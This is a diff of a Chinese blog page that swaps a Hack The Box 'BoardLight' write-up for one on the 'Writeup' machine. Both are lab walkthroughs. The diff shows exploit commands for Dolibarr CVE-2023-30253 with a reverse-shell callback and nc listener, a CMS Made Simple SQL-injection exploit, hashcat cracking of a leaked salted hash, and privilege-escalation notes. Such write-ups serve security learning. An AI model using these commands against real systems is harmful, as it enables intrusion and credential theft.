@@ -16,48 +16,47 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" content="#f8f8f8">
   
-  <title>HTB-BoardLight_Write-up - AyMeow</title>
+  <title>HTB-Writeup_Write-up - AyMeow</title>
 
   
-    <meta name="description" content="HTB-BoardLight_Write-up (✿╹◡╹)">
+    <meta name="description" content="HTB-Writeup_Write-up (ΦωΦ)">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HTB-BoardLight_Write-up">
-<meta property="og:url" content="http://example.com/2024/09/18/HTB-BoardLight_Write-up/index.html">
+<meta property="og:title" content="HTB-Writeup_Write-up">
+<meta property="og:url" content="http://example.com/2024/09/28/HTB-Writeup_Write-up/index.html">
 <meta property="og:site_name" content="AyMeow">
-<meta property="og:description" content="HTB-BoardLight_Write-up (✿╹◡╹)">
+<meta property="og:description" content="HTB-Writeup_Write-up (ΦωΦ)">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea83c1f21886ccc07de457.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea83c0f21886ccc07de3f6.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea83c1f21886ccc07de409.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea83c1f21886ccc07de42b.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea83c1f21886ccc07de446.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea8401f21886ccc07e25c5.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea8401f21886ccc07e25e2.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea8401f21886ccc07e25ec.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea8400f21886ccc07e259f.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea8400f21886ccc07e25a6.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea843ff21886ccc07e5ff7.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea843ff21886ccc07e6020.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea8440f21886ccc07e6032.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea8440f21886ccc07e603d.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea8440f21886ccc07e6044.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea8477f21886ccc07e95ec.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea8475f21886ccc07e93a1.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea8475f21886ccc07e943e.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea8477f21886ccc07e95b1.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea8477f21886ccc07e95ce.jpg">
-<meta property="og:image" content="https://pic.imgdb.cn/item/66ea84a6f21886ccc07ebfdd.jpg">
-<meta property="article:published_time" content="2024-09-18T07:30:00.000Z">
-<meta property="article:modified_time" content="2024-09-24T08:25:12.941Z">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f81918f21886ccc09bcb0f.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f81917f21886ccc09bc9b5.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f81917f21886ccc09bca1e.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f81917f21886ccc09bca64.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f81917f21886ccc09bcaf4.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f81962f21886ccc09c2075.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f81963f21886ccc09c208f.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f81962f21886ccc09c1ff4.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f81962f21886ccc09c203b.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f81962f21886ccc09c2060.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f8199ff21886ccc09c5f9a.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f8199ff21886ccc09c5fab.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f8199ff21886ccc09c5fbd.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f8199ff21886ccc09c5fd5.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f8199ff21886ccc09c5fe9.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f819dbf21886ccc09c9a5f.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f819daf21886ccc09c9930.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f819daf21886ccc09c997f.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f819daf21886ccc09c9a01.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f819dbf21886ccc09c9a24.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66f81a16f21886ccc09d1f09.jpg">
+<meta property="article:published_time" content="2024-09-28T14:50:00.000Z">
+<meta property="article:modified_time" content="2024-09-28T15:01:11.022Z">
 <meta property="article:author" content="AyMeow">
 <meta property="article:tag" content="靶场复现">
-<meta property="article:tag" content="Dolibarr">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://pic.imgdb.cn/item/66ea83c1f21886ccc07de457.jpg">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/66f81918f21886ccc09bcb0f.jpg">
   
   
   
-  <meta name="keywords" content="靶场复现,Dolibarr">
+  <meta name="keywords" content="靶场复现">
 
   <!-- feed -->
   
@@ -97,120 +96,121 @@
 
 
 
-<div class="article banner top"><img class="bg lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea82a5f21886ccc07ccd7b.jpg">
+<div class="article banner top"><img class="bg lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f81822f21886ccc09abb8c.jpg">
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 <span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/">靶场复现</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/HTB/">HTB</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-09-18T07:30:00.000Z">2024-09-18</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-09-24T08:25:12.941Z">2024-09-24</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-09-28T14:50:00.000Z">2024-09-28</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-09-28T15:01:11.022Z">2024-09-28</time></span></div></div></div>
     
     <div class="bottom only-title">
       
       <div class="text-area">
-        <h1 class="text title"><span>HTB-BoardLight_Write-up</span></h1>
+        <h1 class="text title"><span>HTB-Writeup_Write-up</span></h1>
         
       </div>
     </div>
     
   </div>
-  </div><article class="md-text content"><p>HTB-BoardLight_Write-up (✿╹◡╹)</p>
+  </div><article class="md-text content"><p>HTB-Writeup_Write-up (ΦωΦ)</p>
 <span id="more"></span>
 
-<h1 id="HTB-BoardLight-Write-up"><a href="#HTB-BoardLight-Write-up" class="headerlink" title="HTB-BoardLight_Write-up"></a>HTB-BoardLight_Write-up</h1><h2 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1.前期准备"></a>1.前期准备</h2><ul>
-<li><p>连接VPN。</p>
+<h1 id="HTB-Writeup-Write-up"><a href="#HTB-Writeup-Write-up" class="headerlink" title="HTB-Writeup_Write-up"></a>HTB-Writeup_Write-up</h1><h2 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1.前期准备"></a>1.前期准备</h2><ul>
+<li><p>连接VPN！</p>
 </li>
 <li><p>靶场详情：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea83c1f21886ccc07de457.jpg" data-fancybox="true" alt="BoardLight-0" />
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f81918f21886ccc09bcb0f.jpg" data-fancybox="true" alt="Writeup-0" />
 </li>
-<li><p>测试连通性：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea83c0f21886ccc07de3f6.jpg" data-fancybox="true" alt="BoardLight-1" />
+<li><p>测试连通性-<em>来自VIP线路！太流畅辣！</em>：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f81917f21886ccc09bc9b5.jpg" data-fancybox="true" alt="Writeup-1" />
 </li>
-<li><p>连接正常！打靶启动！</p>
+<li><p>十分稳定！开始打靶！</p>
 </li>
 </ul>
 <hr>
-<h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><p>老样子，起手Nmap扫描：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sSVC 10.10.11.11</span><br></pre></td></tr></table></figure>
+<h2 id="2-信息收集-User-txt获取"><a href="#2-信息收集-User-txt获取" class="headerlink" title="2.信息收集-User.txt获取"></a>2.信息收集-User.txt获取</h2><p>Nmap启动！</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sSVC 10.10.10.138</span><br></pre></td></tr></table></figure>
 
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea83c1f21886ccc07de409.jpg" data-fancybox="true" alt="BoardLight-2" />
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f81917f21886ccc09bca1e.jpg" data-fancybox="true" alt="Writeup-2" />
 
-<p>出来两个端口，访问80端口是一个网页，没有什么内容，翻到底部发现有一个域名<code>board.htb</code>：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea83c1f21886ccc07de42b.jpg" data-fancybox="true" alt="BoardLight-3" />
+<p>发现俩端口，还是Linux靶机少端口嗷，一个robots.txt文件，还有一个writeup的路径，没发现域名，访问看看先：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f81917f21886ccc09bca64.jpg" data-fancybox="true" alt="Writeup-3" />
 
-<p>嗯，根据上一个靶场的经验，这个域名应该是关键，浅浅爆一下子域名：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wfuzz/wordlist/subdomains/subdomains-top1million-5000.txt -u &quot;http://board.htb&quot; -H &quot;Host: FUZZ.board.htb&quot; --hc 404 --hl 517</span><br></pre></td></tr></table></figure>
+<p>上面那个公告说启用了防Dos攻击策略，那我们就不爆破目录了，接着访问一下robots.txt看看：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f81917f21886ccc09bcaf4.jpg" data-fancybox="true" alt="Writeup-4" />
 
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea83c1f21886ccc07de446.jpg" data-fancybox="true" alt="BoardLight-4" />
+<p>给了个writeup的网站路径，跟之前Nmap扫出来的信息相符，访问看看：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f81962f21886ccc09c2075.jpg" data-fancybox="true" alt="Writeup-5" />
 
-<p>爆破出来一个<code>crm.board.htb</code>，先加到hosts文件，随后访问得到一个登陆页面：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea8401f21886ccc07e25c5.jpg" data-fancybox="true" alt="BoardLight-5" />
+<p>这几个页面貌似都是介绍，没啥功能点，底部也没有发现什么CMS的信息，那下一步右键查看源代码看看：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f81963f21886ccc09c208f.jpg" data-fancybox="true" alt="Writeup-6" />
 
-<p>可以发现框架是Dolibarr，版本是17.0.0，待会搜索一下一下有没有相关的框架漏洞，针对这个登陆框框再尝试一下弱密码能否登陆进去：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea8401f21886ccc07e25e2.jpg" data-fancybox="true" alt="BoardLight-6" />
+<p>有信息，是通过<code>CMS Made Simple</code>构建的，Google一下喽：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f81962f21886ccc09c1ff4.jpg" data-fancybox="true" alt="Writeup-7" style="zoom:50%;" />
 
-<p>嗯，显然可以-.-，<code>admin/admin</code>就进来了，不过也没发现什么信息，去搜了一下相关的漏洞，发现该版本存在<code>CVE-2023-30253</code>漏洞，已经有现成的<a target="_blank" rel="noopener" href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253">POC</a>，该POC要求要知道账号密码，显然符合目前收集到的信息。</p>
+<p>弹出来的第一个就是CVE-2019-9053这个漏洞，不过第二个链接里面有关于这个CMS的一系列漏洞，结合前面查看源代码的Copyright信息和靶场的创建时间，可以将漏洞范围定在2019年，但是这里我存在一个疑问：2019年关于这个CMS的漏洞其实也不少，怎么确定就是这个9053的呢？瞄了一眼官方的Write-up也没有细说，就直接用了…</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f81962f21886ccc09c203b.jpg" data-fancybox="true" alt="Writeup-8" />
+
+<p>即使看漏洞描述和writeup路径大概可确定是Sql注入相关的，但是还是不太明确，可能还是要一个一个试吧；不过问题不大，在Kali倒是也可以搜到相关的漏洞：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f81962f21886ccc09c2060.jpg" data-fancybox="true" alt="Writeup-9" />
+
+<p>Kali本身也自带POC，但是可能由于我的Kali太新了还是啥的问题，解决不了依赖库的问题；这个POC是需要用Python2来运行的，折腾了一下还是跑不成功，最后还是去Github上找了一个Python3能用的<a target="_blank" rel="noopener" href="https://github.com/ELIZEUOPAIN/CVE-2019-9053-CMS-Made-Simple-2.2.10---SQL-Injection-Exploit">POC</a>：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f8199ff21886ccc09c5f9a.jpg" data-fancybox="true" alt="Writeup-10" />
+
+<p>clone到本地按照所给的语法运行即可：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cve.py -u http://10.10.10.138/writeup --crack -w best110.txt</span><br></pre></td></tr></table></figure>
+
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f8199ff21886ccc09c5fab.jpg" data-fancybox="true" alt="Writeup-11" />
+
+<p>稍等一会就把用户、MD5和盐值都注出来了，那既然盐值和MD5都已知了，用Hashcat爆破一下吧：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;62def4866937f08cc13bab43bb14e6f7:5a599ef579066807&#x27; &gt; hash</span><br><span class="line">hashcat -a 0 -m 20 hash /usr/local/Dict/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>我这里已经破解过了，使用–show来显示结果：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f8199ff21886ccc09c5fbd.jpg" data-fancybox="true" alt="Writeup-12" />
+
+<p>账号密码都有了，尝试SSH连接吧：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f8199ff21886ccc09c5fd5.jpg" data-fancybox="true" alt="Writeup-13" />
+
+<p>登陆成功，User.txt到手~</p>
 <hr>
-<h2 id="3-漏洞利用及提权"><a href="#3-漏洞利用及提权" class="headerlink" title="3.漏洞利用及提权"></a>3.漏洞利用及提权</h2><p>下载好POC上传至Kali中：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea8401f21886ccc07e25ec.jpg" data-fancybox="true" alt="BoardLight-7" />
+<h2 id="3-提权-Root-txt获取"><a href="#3-提权-Root-txt获取" class="headerlink" title="3.提权-Root.txt获取"></a>3.提权-Root.txt获取</h2><p>拿到了User.txt之后，下一步就是提权了，<code>sudo -l</code>没信息，那应该不是这个方向；输入<code>id</code>发现这个用户所在的用户组有点多啊：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f8199ff21886ccc09c5fe9.jpg" data-fancybox="true" alt="Writeup-14" />
 
-<p>根据实际参数设置一下反弹Shell回来的地址：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py http://crm.board.htb admin admin 10.10.16.35 44300</span><br></pre></td></tr></table></figure>
+<p>但是具体这些用户组是干啥用的我不知道，没啥头绪，瞄了一眼官方的Write-up，发现可以在Debian的<a target="_blank" rel="noopener" href="https://wiki.debian.org/SystemGroups">官方文档</a>找到相关信息，翻着翻着发现<code>staff</code>这个用户组可以操作&#x2F;usr&#x2F;local&#x2F;bin而不需要root权限，但是没看懂这能怎么利用，于是开始Write-up学习法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f819dbf21886ccc09c9a5f.jpg" data-fancybox="true" alt="Writeup-15" />
 
-<p>设置监听：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap -cAr nc -lvvp 44300</span><br></pre></td></tr></table></figure>
+<p>查看了一下&#x2F;usr&#x2F;local&#x2F;bin和&#x2F;usr&#x2F;local&#x2F;sbin的目录信息，它们是属于staff组的：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f819daf21886ccc09c9930.jpg" data-fancybox="true" alt="Writeup-16" />
 
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea8400f21886ccc07e259f.jpg" data-fancybox="true" alt="BoardLight-8" />
+<p>Write-up种下一步是上传<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy</a>上去监控进程，看看root用户能做些什么，我这就在Kali上开个临时的Http服务下载了：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f819daf21886ccc09c997f.jpg" data-fancybox="true" alt="Writeup-17" />
 
-<p>成功弹回来了，用户是<code>www-data</code>，这是网站的权限，User的Flag显然不是这个用户，所以先进行一波信息收集，确定一下我们要获取的用户是哪一个：</p>
